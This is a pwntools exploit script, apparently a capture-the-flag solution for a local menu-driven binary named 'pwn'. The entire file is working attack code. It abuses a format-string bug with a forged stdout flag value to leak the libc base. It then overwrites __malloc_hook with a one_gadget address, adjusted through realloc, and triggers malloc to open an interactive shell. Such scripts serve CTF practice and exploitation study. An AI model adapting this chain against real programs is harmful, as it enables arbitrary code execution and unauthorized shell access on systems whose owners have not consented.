from pwn import *
context.terminal = ['tmux', 'splitw', '-h']
context(arch = 'amd64', os = 'linux')
#context(arch = 'i386', os = 'linux')
#context.log_level = 'debug'

io = process("./pwn")
elf = ELF("./pwn")
libc = elf.libc

def debug():
	gdb.attach(io)
	pause()

sd     = lambda s    : io.send(s)
sda    = lambda s, n : io.sendafter(s, n)
sl     = lambda s    : io.sendline(s)
sla    = lambda s, n : io.sendlineafter(s, n)
rc     = lambda n    : io.recv(n)
rut    = lambda s    : io.recvuntil(s, drop=True)
ruf    = lambda s    : io.recvuntil(s, drop=False)
addr   = lambda n    : u64(io.recv(n, timeout=1).ljust(8, b'\x00'))
addr32 = lambda s    : u32(io.recvuntil(s, drop=True, timeout=1).ljust(4, b'\x00'))
addr64 = lambda s    : u64(io.recvuntil(s, drop=True, timeout=1).ljust(8, b'\x00'))
byte   = lambda n    : str(n).encode()
info   = lambda s, n : print("\033[31m["+s+" -> "+str(hex(n))+"]\033[0m")
sh     = lambda      : io.interactive()
menu   = b'choice: '
def add(size, content, flag=True):
	sla(menu, b'1')
	sla(b'size:' , byte(size))
	sleep(0.01)
	if flag:
		sla(b'content: ', content)
	else:
		sda(b'content: ', content)

def say(fmt, content):
	sla(menu, b'2')
	sda(b'say ? ', fmt)
	sla(b'? ', content)

def show():
	sla(menu, b'3')

pay = p64(0xfbad1800) + p64(0)*3
say(b'%7$s', pay)
rc(0x18)
libc.address = addr(6) - 0x3c36e0
info('libc_base', libc.address)

malloc_hook = libc.sym.__malloc_hook
realloc = libc.sym.realloc
ones = [0x45226, 0x4527a, 0xf03a4, 0xf1247]
ones = [libc.address+i for i in ones]

pay0 = b'%7$s5678' + p64(malloc_hook-8)
pay1 = p64(ones[1]) + p64(realloc+8)
say(pay0, pay1)
sla(menu, b'1')
#debug()
sla(b'size: ', b'16')
sh()
